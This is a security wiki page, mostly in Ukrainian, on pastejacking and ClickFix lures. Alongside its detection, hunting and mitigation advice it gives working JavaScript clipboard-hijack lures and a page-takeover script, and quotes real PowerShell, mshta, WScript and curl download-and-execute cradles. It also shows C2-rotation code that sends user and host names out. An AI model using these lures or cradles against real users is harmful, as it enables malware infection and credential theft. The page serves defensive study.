# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Ніколи не вставляйте нічого, чого ви самі не копіювали." – стара, але досі дійсна порада

## Огляд

Clipboard hijacking – також відомий як *pastejacking* – зловживає тим, що користувачі рутинно копіюють і вставляють команди без їх перевірки. Зловмисна веб-сторінка (або будь-який контекст із підтримкою JavaScript, наприклад Electron або Desktop application) програмно поміщає текст, контрольований нападником, у system clipboard. Жертви заохочуються, зазвичай ретельно підготовленими інструкціями соціальної інженерії, натиснути **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), або відкрити термінал і *paste* вміст clipboard, при цьому негайно виконуючи довільні команди.

Оскільки **файл не завантажується і вкладення не відкривається**, техніка обходить більшість засобів безпеки електронної пошти та веб-контенту, які моніторять вкладення, макроси або пряме виконання команд. Тому атака популярна в phishing кампаніях, що доставляють комерційні сімейства malware, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.

## Примусові кнопки копіювання та приховані payloads (macOS one-liners)

Деякі macOS infostealers клонують сайти інсталяторів (наприклад, Homebrew) і **примушують використовувати кнопку “Copy”**, щоб користувачі не могли виділити лише видимий текст. Запис у clipboard містить очікувану команду інсталятора плюс доданий Base64 payload (наприклад, `...; echo <b64> | base64 -d | sh`), тому один *paste* виконує обидва етапи, поки UI приховує додаткову стадію.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Старі кампанії використовували `document.execCommand('copy')`, новіші покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Користувач відвідує typosquatted або скомпрометований сайт (наприклад `docusign.sa[.]com`)
2. Інжектований JavaScript **ClearFake** викликає допоміжну функцію `unsecuredCopyToClipboard()`, яка безшумно зберігає Base64-encoded PowerShell one-liner у буфері обміну.
3. HTML-інструкції кажуть жертві: *«Натисніть **Win + R**, вставте команду і натисніть Enter, щоб вирішити проблему.»*
4. `powershell.exe` запускається, завантажуючи архів, який містить легітимний виконуваний файл та шкідливу DLL (classic DLL sideloading).
5. Лоадер розшифровує додаткові стадії, інжектує shellcode та встановлює persistence (наприклад scheduled task) — зрештою запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.

### Приклад ланцюга NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) шукає у своєму каталозі `msvcp140.dll`.
* Зловмисний DLL динамічно визначає адреси API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, дешифрує їх, використовуючи rolling XOR key `"https://google.com/"`, впроваджує фінальний shellcode і розпаковує **client32.exe** (NetSupport RAT) до `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript downloader у **cscript.exe**
3. Отримує MSI payload → розміщує `libcef.dll` поруч із підписаною програмою → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call запускає прихований PowerShell-скрипт, який завантажує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відтворює `AutoIt3.exe` за допомогою `extrac32` та конкатенації файлів і нарешті запускає `.a3x` скрипт, який ексфільтрує облікові дані браузера на `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK з ротацією C2 (PureHVNC)

Деякі кампанії ClickFix повністю оминають завантаження файлів і наказують жертвам вставити однорядкову команду, яка отримує та виконує JavaScript через WSH, забезпечує персистентність і щоденно змінює C2. Приклад спостереженого ланцюга:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові ознаки
- Обфускований URL перевертається під час виконання, щоб ускладнити поверхневу перевірку.
- JavaScript зберігає себе через Startup LNK (WScript/CScript) і обирає C2 за поточним днем — що дозволяє швидку ротацію доменів.

Мінімальний фрагмент JS, що використовується для ротації C2s за датою:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто pinning TLS до жорстко закодованого certificate і chunking трафіку.

Detection ideas specific to this variant
- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (або `cscript.exe`).
- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, що викликає WScript/CScript з JS шляхом під `%TEMP%`/`%APPDATA%`.
- Реєстр/RunMRU та телеметрія командного рядка, що містять `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторювані `powershell -NoProfile -NonInteractive -Command -` з великими stdin payloads для передачі довгих скриптів без довгих командних рядків.
- Заплановані завдання, які згодом виконують LOLBins, такі як `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` під задачею/шляхом, що виглядає як оновлювач (наприклад, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Щоденно-обертаючіся C2 hostnames і URLs з шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Корелюйте події запису в clipboard, за якими слідує вставка Win+R і негайне виконання `powershell.exe`.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Реєстр Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію **Win + R** команд – шукати незвичні Base64 / обфусковані записи.
* Security Event ID **4688** (Process Creation), коли `ParentImage` == `explorer.exe` і `NewProcessName` належить { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створень файлів під `%LocalAppData%\Microsoft\Windows\WinX\` або у тимчасових папках безпосередньо перед підозрілою подією 4688.
* EDR clipboard sensors (якщо присутні) – корелюйте `Clipboard Write`, за яким одразу слідує новий процес PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Нещодавні кампанії масово створюють підробні CDN/browser verification pages ("Just a moment…", IUAM-style), які змушують користувачів копіювати OS-специфічні команди з їхнього clipboard у нативні консолі. Це дозволяє виконання поза браузерним sandbox і працює як у Windows, так і в macOS.

Key traits of the builder-generated pages
- Визначення OS через `navigator.userAgent` для підгонки payloads (Windows PowerShell/CMD vs. macOS Terminal). Опціональні приманки/no-ops для непідтримуваних ОС, щоб зберегти ілюзію.
- Автоматичне копіювання в clipboard при благовидних UI-діях (checkbox/Copy), тоді як видимий текст може відрізнятися від вмісту clipboard.
- Блокування мобільних пристроїв та поповер із покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Опціональна обфускація та single-file injector для перезапису DOM скомпрометованого сайту Tailwind-styled verification UI (не вимагається реєстрація нового домену).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence під час початкового запуску
- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, щоб виконання продовжувалося після закриття терміналу, зменшуючи видимі артефакти.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Сторінки, що прив’язують Clipboard API до віджетів верифікації; невідповідність між відображуваним текстом та clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace у підозрілих контекстах.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` незабаром після взаємодії з браузером; batch/MSI installers, виконані з `%TEMP%`.
- macOS endpoint: Terminal/iTerm, що породжують `bash`/`curl`/`base64 -d` з `nohup` поблизу подій браузера; фоні job-и, які виживають після закриття терміналу.
- Корелюйте `RunMRU`/Win+R історію та clipboard writes з подальшим створенням консольних процесів.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake продовжує компрометувати WordPress сайти та інжектити loader JavaScript, який ланцюжить зовнішні хости (Cloudflare Workers, GitHub/jsDelivr) і навіть blockchain “etherhiding” виклики (наприклад, POSTs до Binance Smart Chain API endpoints таких як `bsc-testnet.drpc[.]org`) для підвантаження поточної логіки приманки. Останні оверлеї широко використовують фейкові CAPTCHA, які просять користувачів скопіювати/вставити one-liner (T1204.004) замість завантаження чогось.
- Початкове виконання все більше делегується signed script hosts/LOLBAS. Ланцюжки січня 2026 замінили раннє використання `mshta` на вбудований `SyncAppvPublishingServer.vbs`, що запускається через `WScript.exe`, передаючи PowerShell-like аргументи з aliases/wildcards для отримання віддаленого контенту:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` підписаний і зазвичай використовується App-V; у парі з `WScript.exe` та незвичайними аргументами (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) він стає надійним індикатором (high-signal) у ланцюжку LOLBAS для ClearFake.
- У лютому 2026 року підроблені CAPTCHA payloads повернулися до чистих PowerShell download cradles. Два реальних приклади:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Перший ланцюг — in-memory `iex(irm ...)` grabber; другий виконує стадії через `WinHttp.WinHttpRequest.5.1`, записує тимчасовий `.ps1`, а потім запускає з `-ep bypass` у прихованому вікні.

Поради з виявлення/полювання для цих варіантів
- Process lineage: браузер → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` або PowerShell cradles одразу після записів у буфер обміну/натискання Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, або raw IP `iex(irm ...)` patterns.
- Network: вихідні з’єднання до CDN worker hosts або blockchain RPC endpoints від script hosts/PowerShell незабаром після веб-перегляду.
- File/registry: тимчасове створення `.ps1` під `%TEMP%` плюс RunMRU записи, що містять ці one-liners; блокувати/генерувати alert на signed-script LOLBAS (WScript/cscript/mshta), що виконується з external URLs або обфускованими alias-рядками.

## Пом'якшення

1. Програми/браузери — жорстке налаштування браузера: відключити доступ до запису в буфер обміну (`dom.events.asyncClipboard.clipboardItem` тощо) або вимагати user gesture.
2. Security awareness — навчити користувачів *вводити* чутливі команди вручну або спочатку вставляти їх у текстовий редактор.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control для блокування довільних one-liners.
4. Network controls — блокувати вихідні запити до відомих pastejacking та malware C2 доменів.

## Пов'язані трюки

* **Discord Invite Hijacking** часто зловживає тим самим підходом ClickFix після заманювання користувачів у шкідливий сервер:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Джерела

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
